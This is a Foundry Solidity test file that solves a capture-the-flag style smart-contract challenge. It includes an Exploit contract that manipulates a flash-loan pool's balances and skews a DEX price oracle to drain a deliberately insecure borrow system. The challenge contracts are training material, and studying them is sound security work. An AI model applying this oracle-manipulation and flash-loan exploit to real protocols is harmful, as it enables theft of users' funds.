// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import {InSecureumToken} from "../src/tokens/tokenInsecureum.sol";
import {BoringToken} from "../src/tokens/tokenBoring.sol";

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {InsecureDexLP} from "../src/Challenge2.DEX.sol";
import {InSecureumLenderPool} from "../src/Challenge1.lenderpool.sol";
import {BorrowSystemInsecureOracle} from "../src/Challenge3.borrow_system.sol";


contract Challenge3Test is Test {
    // dex & oracle
    InsecureDexLP oracleDex;
    // flash loan
    InSecureumLenderPool flashLoanPool;
    // borrow system, contract target to break
    BorrowSystemInsecureOracle target;

    // insecureum token
    IERC20 token0;
    // boring token
    IERC20 token1;

    address player = makeAddr("player");

    function setUp() public {

        // create the tokens
        token0 = IERC20(new InSecureumToken(30000 ether));
        token1 = IERC20(new BoringToken(20000 ether));
        
        // setup dex & oracle
        oracleDex = new InsecureDexLP(address(token0),address(token1));

        token0.approve(address(oracleDex), type(uint256).max);
        token1.approve(address(oracleDex), type(uint256).max);
        oracleDex.addLiquidity(100 ether, 100 ether);

        // setup flash loan service
        flashLoanPool = new InSecureumLenderPool(address(token0));
        // send tokens to the flashloan pool
        token0.transfer(address(flashLoanPool), 10000 ether);

        // setup the target conctract
        target = new BorrowSystemInsecureOracle(address(oracleDex), address(token0), address(token1));

        // lets fund the borrow
        token0.transfer(address(target), 10000 ether);
        token1.transfer(address(target), 10000 ether);

        vm.label(address(oracleDex), "DEX");
        vm.label(address(flashLoanPool), "FlashloanPool");
        vm.label(address(token0), "InSecureumToken");
        vm.label(address(token1), "BoringToken");

    }

    function testChallenge3() public {  

        vm.startPrank(player);

        /*//////////////////////////////
        //    Add your hack below!    //
        //////////////////////////////*/

        //============================//
        Exploit exp = new Exploit(oracleDex, target, token0, token1);

        flashLoanPool.flashLoan(
          address(exp),
          abi.encodeWithSignature(
            "receiveFlashLoan(address)", address(exp)
          )
        );

        exp.withdrawFunds(address(flashLoanPool));
        exp.hack();

        vm.stopPrank();

        assertEq(token0.balanceOf(address(target)), 0, "You should empty the target contract");

    }
}

/*////////////////////////////////////////////////////////////
//          DEFINE ANY NECESSARY CONTRACTS HERE             //
////////////////////////////////////////////////////////////*/

contract Exploit {

    /// @dev Token contract address to be used for lending.
    //IERC20 immutable public token;
    IERC20 public token;
    /// @dev Internal balances of the pool for each user.
    mapping(address => uint) public balances;

    // flag to notice contract is on a flashloan
    bool private _flashLoan;
    

    IERC20 token0;
    IERC20 token1;
    BorrowSystemInsecureOracle borrowSystem;
    InsecureDexLP dex;


    //Flashloan event
    function receiveFlashLoan(address _attacker) external {
        balances[_attacker] = 10000 ether;
    }

    //Flashloan withdraw
    function withdrawFunds(address _contractToHack) external {
        _contractToHack.call(abi.encodeWithSignature("withdraw(uint256)", 10000 ether));
    }
    
    
    constructor(InsecureDexLP _dex, BorrowSystemInsecureOracle _borrowSystem, IERC20 _token0, IERC20 _token1 ){
        token0 = _token0;
        token1 = _token1;
        borrowSystem = _borrowSystem;
     
        dex = _dex;

        token0.approve(address(borrowSystem), 10000 ether);
        token0.approve(address(dex), 10000 ether);
        token1.approve(address(borrowSystem), 10000 ether);
        token1.approve(address(dex), 10000 ether);
    }


    function hack() public {
        uint256 balance0 = token0.balanceOf(address(this));
        dex.swap(address(token0), address(token1), balance0);

        uint256 balance1 = token1.balanceOf(address(this));
        
        borrowSystem.depositToken1(balance1);
        borrowSystem.borrowToken0(balance0);
    }
    
}
